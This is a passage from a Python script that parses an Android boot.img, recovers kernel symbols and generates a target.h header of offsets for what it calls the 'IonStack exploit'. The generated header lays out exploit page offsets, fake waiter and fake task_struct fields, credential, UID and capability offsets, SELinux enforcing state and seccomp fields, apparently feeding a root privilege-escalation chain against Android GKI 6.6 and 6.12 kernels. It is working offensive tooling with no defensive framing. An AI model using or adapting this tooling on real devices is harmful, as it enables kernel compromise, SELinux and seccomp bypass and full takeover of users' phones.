        lines.append(" * do not exist. ASHMEM_FOPS_OFF points to the const file_operations")
        lines.append(" * table generated by the Rust MiscDevice framework (in .rodata).")
        lines.append(" * ASHMEM_MISC_FOPS_OFF points to the ASHMEM_FOPS_PTR BSS variable")
        lines.append(" * which holds the fops pointer at runtime (filled by")
        lines.append(" * __ashmem_rust_init). The remaining ASHMEM_*_OFF values are the")
        lines.append(" * Rust MiscDevice vtable trampoline functions. */")

    if off('security_hook_heads_src') == 'static_call':
        lines.append("/* This kernel replaced the security_hook_heads list_head array")
        lines.append(" * with static-call based security_hook_active_* slots. The")
        lines.append(" * SECURITY_HOOK_HEADS_OFF is computed as")
        lines.append(" * security_hook_active_capable_0 - 0x40, so that")
        lines.append(" * SECURITY_CAPABLE_HEAD (= SECURITY_HOOK_HEADS + 0x40) lands on")
        lines.append(" * security_hook_active_capable_0. root.c only uses the")
        lines.append(" * before/after comparison for diagnostics, so reading this")
        lines.append(" * address is safe. */")

    sym_defines = [
        ('ASHMEM_MISC_FOPS_OFF', off('ashmem_misc_fops')),
        ('ASHMEM_FOPS_OFF', off('ashmem_fops')),
        ('ASHMEM_IOCTL_OFF', off('ashmem_ioctl')),
        ('ASHMEM_COMPAT_IOCTL_OFF', off('compat_ashmem_ioctl')),
        ('ASHMEM_MMAP_OFF', off('ashmem_mmap')),
        ('ASHMEM_OPEN_OFF', off('ashmem_open')),
        ('ASHMEM_RELEASE_OFF', off('ashmem_release')),
        ('ASHMEM_SHOW_FDINFO_OFF', off('ashmem_show_fdinfo')),
        ('CONFIGFS_READ_ITER_OFF', off('configfs_read_iter')),
        ('CONFIGFS_BIN_WRITE_ITER_OFF', off('configfs_bin_write_iter')),
        ('COPY_SPLICE_READ_OFF', off('copy_splice_read')),
        ('NOOP_LLSEEK_OFF', off('noop_llseek')),
        ('INIT_TASK_OFF', off('init_task')),
        ('ROOT_TASK_GROUP_OFF', off('root_task_group')),
        ('SELINUX_BLOB_SIZES_OFF', off('selinux_blob_sizes')),
        ('SELINUX_ENFORCING_OFF', off('selinux_state')),
        ('SECURITY_HOOK_HEADS_OFF', off('security_hook_heads')),
        ('KMALLOC_CACHES_OFF', off('kmalloc_caches')),
        ('ANON_PIPE_BUF_OPS_OFF', off('anon_pipe_buf_ops')),
    ]
    for name, val in sym_defines:
        if val is not None:
            lines.append(f"#define {name} {val:#010x}ULL")
    lines.append("")

    # Symbol address macros
    for name, _ in sym_defines:
        base = name.replace('_OFF', '')
        lines.append(f"#define {base} (KIMAGE_TEXT_BASE + {name})")
    lines.append("")

    # SLIDE offsets
    slide_off = off('SLIDE_NFULNL_LOGGER_OFF')
    loggers_off = off('SLIDE_LOGGERS_0_1_OFF')
    bootid_data_off = off('SLIDE_RANDOM_BOOT_ID_DATA_OFF')
    sysctl_bootid_off = off('SLIDE_SYSCTL_BOOTID_OFF')

    lines.append(f"#define SLIDE_NFULNL_LOGGER_OFF {slide_off:#010x}ULL")
    lines.append(f"#define SLIDE_LOGGERS_0_1_OFF {loggers_off:#010x}ULL")
    lines.append(f"#define SLIDE_RANDOM_BOOT_ID_DATA_OFF {bootid_data_off:#010x}ULL")
    lines.append("#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF")
    lines.append("#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF")
    lines.append(f"#define SLIDE_SYSCTL_BOOTID_OFF {sysctl_bootid_off:#010x}ULL")
    lines.append("#define SLIDE_WONLY_BOOTID 1")
    lines.append("")
    lines.append("#define SLIDE_NFULNL_LOGGER_IMAGE \\")
    lines.append("  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)")
    lines.append("#define SLIDE_LOGGERS_0_1_IMAGE \\")
    lines.append("  (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)")
    lines.append("#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \\")
    lines.append("  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)")
    lines.append("#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)")
    lines.append("#define SLIDE_ROOT_TASK_GROUP_IMAGE \\")
    lines.append("  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)")
    lines.append("#define SLIDE_SYSCTL_BOOTID_IMAGE \\")
    lines.append("  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)")
    lines.append("")

    # Exploit page layout (constant for IonStack exploit)
    lines.append("#define LOCK_OFF 0x1350")
    lines.append("#define W0_OFF 0x2220")
    lines.append("#define FOPS_OFF 0x1000")
    lines.append("#define SCRATCH_OFF 0x3000")
    lines.append("#define RIGHT_OFF 0x4440")
    lines.append("#define LEFT_OFF 0x5550")
    lines.append("#define FAKE_TASK_OFF 0x3200")
    lines.append("")

    # Waiter struct offsets (GKI 6.6 constant)
    waiter_defs = [
        ("WAITER_LOCAL_OFF", "0x80"),
        ("WAITER_TREE_ENTRY_OFF", "0x00"),
        ("WAITER_PI_TREE_ENTRY_OFF", "0x18"),
        ("WAITER_TASK_OFF", "0x30"),
        ("WAITER_LOCK_OFF", "0x38"),
        ("WAITER_WAKE_STATE_OFF", "0x40"),
        ("WAITER_PRIO_OFF", "0x44"),
        ("WAITER_DEADLINE_OFF", "0x48"),
        ("WAITER_WW_CTX_OFF", "0x50"),
    ]
    for name, val in waiter_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Fake waiter struct offsets (GKI 6.6 constant)
    fake_waiter_defs = [
        ("FAKE_WAITER_TREE_PRIO_OFF", "0x18"),
        ("FAKE_WAITER_TREE_DEADLINE_OFF", "0x20"),
        ("FAKE_WAITER_PI_TREE_ENTRY_OFF", "0x28"),
        ("FAKE_WAITER_PI_TREE_PRIO_OFF", "0x40"),
        ("FAKE_WAITER_PI_TREE_DEADLINE_OFF", "0x48"),
        ("FAKE_WAITER_TASK_OFF", "0x50"),
        ("FAKE_WAITER_LOCK_OFF", "0x58"),
        ("FAKE_WAITER_WAKE_STATE_OFF", "0x60"),
        ("FAKE_WAITER_WW_CTX_OFF", "0x68"),
    ]
    for name, val in fake_waiter_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Fake task struct offsets (GKI 6.6 constant)
    fake_task_defs = [
        ("FAKE_TASK_USAGE_OFF", "0x40"),
        ("FAKE_TASK_PRIO_OFF", "0x84"),
        ("FAKE_TASK_NORMAL_PRIO_OFF", "0x8c"),
        ("FAKE_TASK_TASK_GROUP_OFF", "0x348"),
        ("FAKE_TASK_PI_LOCK_OFF", "0x90c"),
        ("FAKE_TASK_PI_WAITERS_OFF", "0x920"),
        ("FAKE_TASK_PI_TOP_TASK_OFF", "0x930"),
        ("FAKE_TASK_PI_BLOCKED_ON_OFF", "0x938"),
    ]
    for name, val in fake_task_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # ConfigFS offsets (GKI 6.6 constant)
    cfg_defs = [
        ("CFG_PAGE_OFF", "16"),
        ("CFG_NEEDS_READ_FILL_OFF", "80"),
        ("CFG_BIN_BUFFER_OFF", "88"),
        ("CFG_BIN_BUFFER_SIZE_OFF", "96"),
        ("CFG_CB_MAX_SIZE_OFF", "100"),
    ]
    for name, val in cfg_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Task struct offsets (verified)
    task = verified.get('task', {})
    task_defs = [
        ("MM_OWNER_OFF", "1032"),
        ("TASK_PID_OFF", hex(task.get('TASK_PID_OFF', 0x618))),
        ("TASK_TGID_OFF", hex(task.get('TASK_TGID_OFF', 0x61c))),
        ("TASK_REAL_PARENT_OFF", hex(task.get('TASK_REAL_PARENT_OFF', 0x628))),
        ("TASK_ATOMIC_FLAGS_OFF", hex(task.get('TASK_ATOMIC_FLAGS_OFF', 0x5d8))),
        ("TASK_REAL_CRED_OFF", hex(task.get('TASK_REAL_CRED_OFF', 0x818))),
        ("TASK_CRED_OFF", hex(task.get('TASK_CRED_OFF', 0x820))),
        ("TASK_COMM_OFF", hex(task.get('TASK_COMM_OFF', 0x830))),
        ("TASK_TASKS_OFF", hex(task.get('TASK_TASKS_OFF', 0x550))),
        ("TASK_THREAD_INFO_FLAGS_OFF", "0x00"),
        ("TASK_SECCOMP_OFF", hex(task.get('TASK_SECCOMP_OFF', 0x8e8))),
    ]
    for name, val in task_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Cred struct offsets (verified)
    cred = verified.get('cred', {})
    cred_defs = [
        ("CRED_UID_OFF", str(cred.get('CRED_UID_OFF', 8))),
        ("CRED_SECUREBITS_OFF", str(cred.get('CRED_SECUREBITS_OFF', 40))),
        ("CRED_CAPS_OFF", str(cred.get('CRED_CAPS_OFF', 48))),
        ("CRED_SECURITY_OFF", str(cred.get('CRED_SECURITY_OFF', 128))),
        ("SELINUX_CRED_BLOB_OFF", "0"),
        ("SELINUX_CRED_OSID_OFF", "0"),
        ("SELINUX_CRED_SID_OFF", "4"),
    ]
    for name, val in cred_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Seccomp / page / pipe / FOPS offsets (GKI 6.6 constant)
    const_defs = [
        ("SECCOMP_MODE_OFF", "0x00"),
        ("SECCOMP_FILTER_COUNT_OFF", "0x04"),
        ("SECCOMP_FILTER_OFF", "0x08"),
        ("TIF_SECCOMP_BIT", "11"),
        ("PFA_NO_NEW_PRIVS_BIT", "0"),
    ]
    for name, val in const_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # Page / pipe constants
    page_defs = [
        ("STRUCT_PAGE_SIZE", "0x40"),
        ("STRUCT_PAGE_COMPOUND_HEAD_OFF", "0x08"),
        ("STRUCT_SLAB_CACHE_OFF", "0x08"),
        ("STRUCT_PAGE_TYPE_OFF", "0x30"),
    ]
    for name, val in page_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    pipe_defs = [
        ("PIPE_BUFFER_SIZE", "0x28"),
        ("PIPE_BUFFER_SLOTS", "32"),
        ("PIPE_BUF_FLAG_CAN_MERGE", "0x10"),
    ]
    for name, val in pipe_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")

    # FOPS offsets (layout-dependent: 6.6 vs 6.12)
    fops_defs = FOPS_FIELD_DEFINES.get(fops_layout, FOPS_FIELD_DEFINES['6.6'])
    for name, val in fops_defs:
        lines.append(f"#define {name} {val}")
    lines.append("")
    lines.append("#endif")

    return '\n'.join(lines) + '\n'


# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Automated kernel offset extraction from Android boot.img'
    )
    parser.add_argument('boot_img', help='Path to boot.img file')
    parser.add_argument('-o', '--output', default='./extracted_target',
                        help='Output directory (default: ./extracted_target)')
    parser.add_argument('-k', '--kallsyms', default=None,
                        help='Pre-recovered kallsyms file')
    parser.add_argument('--keep-intermediate', action='store_true',
                        help='Keep intermediate files')
    parser.add_argument('--target-name', default=None,
                        help='Target directory name (default: auto-detected)')
    parser.add_argument('--device', default=None,
                        help='Override device name in BUILD_VARIANT_LABEL '
                             '(e.g., "ace5s"). Default: from fingerprint.')
    args = parser.parse_args()

    boot_path = args.boot_img
    if not os.path.exists(boot_path):
        print(f"Error: {boot_path} not found", file=sys.stderr)
        sys.exit(1)

    # Step 1: Read boot.img
    print(f"[1/7] Reading boot.img: {boot_path}")
    with open(boot_path, 'rb') as f:
        boot_data = f.read()
    print(f"  Size: {len(boot_data)} bytes ({len(boot_data) / 1024 / 1024:.1f} MB)")

    # Step 2: Parse boot.img header
    print("[2/7] Parsing boot.img header")
    boot_info = parse_boot_img(boot_data)
    print(f"  Header version: v{boot_info['header_version']}")
    print(f"  Kernel size: {boot_info['kernel_size']} bytes ({boot_info['kernel_size'] / 1024 / 1024:.1f} MB)")
    print(f"  Kernel offset: {boot_info['kernel_offset']:#x}")

    # Step 3: Extract and decompress kernel
    print("[3/7] Extracting kernel Image")
    kernel_img = extract_kernel(boot_info)
    print(f"  Decompressed size: {len(kernel_img)} bytes ({len(kernel_img) / 1024 / 1024:.1f} MB)")

    # Save kernel Image
    os.makedirs(args.output, exist_ok=True)
    kernel_path = os.path.join(args.output, 'kernel.Image')
    with open(kernel_path, 'wb') as f:
        f.write(kernel_img)
    print(f"  Saved to: {kernel_path}")

    # Step 4: Recover kallsyms
    print("[4/7] Recovering kallsyms")
    if args.kallsyms:
        print(f"  Using pre-recovered kallsyms: {args.kallsyms}")
        syms = parse_kallsyms_file(args.kallsyms)
    else:
        syms = recover_kallsyms(kernel_path)
    print(f"  Recovered {len(syms)} symbols")

    # Check required symbols
    missing = []
    for name in REQUIRED_SYMBOLS:
        aliases = SYMBOL_ALIASES.get(name, [name])
        found = any(a in syms for a in aliases)
        if not found:
            missing.append(name)
    if missing:
        print(f"  WARNING: Missing symbols: {', '.join(missing)}", file=sys.stderr)

    # Step 5: Binary analysis and verification
    print("[5/7] Verifying offsets via binary analysis")
    ki = KernelImage(kernel_img, syms)

    # Collect all symbol offsets
    offsets = {}
    fops_layout = '6.6'  # default, will be updated by verification
    ashmem_impl = 'c'    # default, will be updated if Rust ashmem detected

    # Detect ashmem implementation: C (traditional) vs Rust (Qualcomm 6.12)
    has_c_ashmem = ki.sym_addr('ashmem_fops') is not None
    rust_methods = ki.find_rust_ashmem_methods() if not has_c_ashmem else {}

    if has_c_ashmem:
        print("  ashmem implementation: C (traditional symbols)")
        ashmem_impl = 'c'

        # ASHMEM_MISC_FOPS (special: ashmem_misc + fops field offset)
        misc_fops_off, misc_msg = ki.find_ashmem_misc_fops()
        if misc_fops_off is not None:
            offsets['ashmem_misc_fops'] = misc_fops_off
            print(f"  ASHMEM_MISC_FOPS: {misc_fops_off:#010x} ({misc_msg})")
        else:
            print(f"  WARNING: ASHMEM_MISC_FOPS: {misc_msg}", file=sys.stderr)

        # Other ashmem symbol offsets (C symbols)
        ashmem_sym_map = [
            ('ashmem_fops', 'ashmem_fops'),
            ('ashmem_ioctl', 'ashmem_ioctl'),
            ('compat_ashmem_ioctl', 'compat_ashmem_ioctl'),
            ('ashmem_mmap', 'ashmem_mmap'),
            ('ashmem_open', 'ashmem_open'),
            ('ashmem_release', 'ashmem_release'),
            ('ashmem_show_fdinfo', 'ashmem_show_fdinfo'),
        ]
        for key, sym_name in ashmem_sym_map:
            sym_off = ki.sym_off(sym_name)
            if sym_off is not None:
                offsets[key] = sym_off
                print(f"  {key}: {sym_off:#010x}")
            else:
                print(f"  WARNING: {key} (symbol {sym_name}): not found",
                      file=sys.stderr)

    elif rust_methods:
        print(f"  ashmem implementation: Rust (ashmem_rust module)")
        print(f"  Found {len(rust_methods)} Rust ashmem vtable methods:")
        ashmem_impl = 'rust'

        # Method name -> offsets key mapping
        rust_method_keys = {
            'ioctl': 'ashmem_ioctl',
            'compat_ioctl': 'compat_ashmem_ioctl',
            'mmap': 'ashmem_mmap',
            'open': 'ashmem_open',
            'release': 'ashmem_release',
            'show_fdinfo': 'ashmem_show_fdinfo',
        }
        for method, addr in sorted(rust_methods.items()):
            sym_off = ki.addr_to_off(addr)
            key = rust_method_keys.get(method)
            if key:
                offsets[key] = sym_off
            print(f"    {method}: {addr:#018x} (off {sym_off:#010x})")

        # Locate the file_operations table by scanning for function pointers
        print("  --- Locating Rust ashmem fops table ---")
        layout_name, fops_off, fops_ok = ki.verify_fops_layout(
            methods=rust_methods)
        if fops_ok and fops_off is not None:
            offsets['ashmem_fops'] = fops_off
            fops_layout = layout_name
            print(f"  ASHMEM_FOPS: fops_off={fops_off:#010x} "
                  f"(layout={layout_name})")
        else:
            print(f"  WARNING: could not locate Rust ashmem fops table: "
                  f"{fops_ok}", file=sys.stderr)

        # Locate ASHMEM_FOPS_PTR BSS variable
        fops_ptr_off, fops_ptr_sym = ki.find_ashmem_fops_ptr()
        if fops_ptr_off is not None:
            offsets['ashmem_misc_fops'] = fops_ptr_off
            print(f"  ASHMEM_MISC_FOPS: {fops_ptr_off:#010x} "
                  f"({fops_ptr_sym})")
        else:
            print("  WARNING: ASHMEM_FOPS_PTR not found in kallsyms",
                  file=sys.stderr)

    else:
        print("  WARNING: neither C nor Rust ashmem symbols found",
              file=sys.stderr)

    # Non-ashmem symbol offsets (common to both implementations)
    sym_map = [
        ('configfs_read_iter', 'configfs_read_iter'),
        ('configfs_bin_write_iter', 'configfs_bin_write_iter'),
        ('copy_splice_read', 'copy_splice_read'),
        ('noop_llseek', 'noop_llseek'),
        ('init_task', 'init_task'),
        ('root_task_group', 'root_task_group'),
        ('selinux_blob_sizes', 'selinux_blob_sizes'),
        ('selinux_state', 'selinux_state'),
        ('kmalloc_caches', 'kmalloc_caches'),
        ('anon_pipe_buf_ops', 'anon_pipe_buf_ops'),
    ]
    for key, sym_name in sym_map:
        sym_off = ki.sym_off(sym_name)
        if sym_off is not None:
            offsets[key] = sym_off
            print(f"  {key}: {sym_off:#010x}")
        else:
            print(f"  WARNING: {key} (symbol {sym_name}): not found",
                  file=sys.stderr)

    # SECURITY_HOOK_HEADS (with 6.12 static-call fallback)
    print("  --- security_hook_heads ---")
    hook_off, hook_src = ki.find_security_hook_heads_off()
    if hook_off is not None:
        offsets['security_hook_heads'] = hook_off
        if 'static' in hook_src:
            offsets['security_hook_heads_src'] = 'static_call'
        print(f"  SECURITY_HOOK_HEADS: {hook_off:#010x} ({hook_src})")
    else:
        print("  WARNING: SECURITY_HOOK_HEADS not found", file=sys.stderr)

    # SLIDE offsets
    print("  --- SLIDE offsets ---")
    slide = ki.find_slide_offsets()
    for name, val in slide.items():
        if val is not None:
            offsets[name] = val  # keep original uppercase key
            print(f"  {name}: {val:#010x}")

    # FOPS layout verification (for C ashmem; Rust already verified above)
    if ashmem_impl == 'c':
        print("  --- FOPS layout verification ---")
        layout_name, fops_off, fops_ok = ki.verify_fops_layout()
        if fops_ok:
            fops_layout = layout_name
            print(f"  FOPS layout: VERIFIED (layout={layout_name})")
        else:
            print(f"  FOPS layout: using default {fops_layout} "
                  f"(verification result: {fops_ok})")

    # Verify task_struct offsets
    print("  --- task_struct offset verification ---")
    task_results = ki.verify_task_offsets()
    if task_results:
        for name, val in task_results.items():
            print(f"  {name} = {val:#x}")
    else:
        print("  Using default task_struct offsets")

    # Verify cred struct offsets
    print("  --- cred struct offset verification ---")
    cred_results = ki.verify_cred_offsets()
    if cred_results:
        for name, val in cred_results.items():
            print(f"  {name} = {val}")

    # Step 6: Extract build info and memory layout
    print("[6/7] Extracting build info")
    build_info = extract_build_info(boot_data, kernel_img)
    if 'linux_version' in build_info:
        print(f"  Linux version: {build_info['linux_version']}")
    if 'build_fingerprint' in build_info:
        print(f"  Build fingerprint: {build_info['build_fingerprint']}")
    if 'build_id' in build_info:
        print(f"  Build ID: {build_info['build_id']}")

    # Determine memory layout
    kimage_base = syms.get('_text', 0xffffffc080000000)
    text_offset = get_text_offset(kernel_img)
    phys_offset = detect_phys_offset(build_info)
    print(f"  KIMAGE_TEXT_BASE: {kimage_base:#018x}")
    print(f"  text_offset: {text_offset:#x}")
    print(f"  P0_PHYS_OFFSET: {phys_offset:#010x} (platform heuristic)")
    print(f"  P0_KERNEL_PHYS_LOAD: {phys_offset + text_offset:#010x}")

    # Step 7: Generate target.h
    print("[7/7] Generating target.h")

    # Determine target name
    if args.target_name:
        target_name = args.target_name
    else:
        build_id = build_info.get('build_id', 'unknown')
        device = build_info.get('device', 'unknown').split(':')[0]
        target_name = f"{device}-{build_id}"

    target_dir = os.path.join(args.output, target_name)
    os.makedirs(target_dir, exist_ok=True)
    target_path = os.path.join(target_dir, 'target.h')

    verified = {
        'task': task_results or {},
        'cred': cred_results or {},
    }

    content = generate_targeth(
        target_name, build_info, kimage_base, phys_offset,
        text_offset, offsets, verified, device_override=args.device,
        fops_layout=fops_layout, ashmem_impl=ashmem_impl
    )

    with open(target_path, 'w') as f:
        f.write(content)
    print(f"  Written to: {target_path}")

    # Cleanup
    if not args.keep_intermediate:
        try:
            os.remove(kernel_path)
            elf_path = kernel_path + '.elf'
            if os.path.exists(elf_path):
                os.remove(elf_path)
        except OSError:
            pass

    print("\n=== Done ===")
    print(f"target.h: {target_path}")
    return 0


if __name__ == '__main__':
    sys.exit(main())
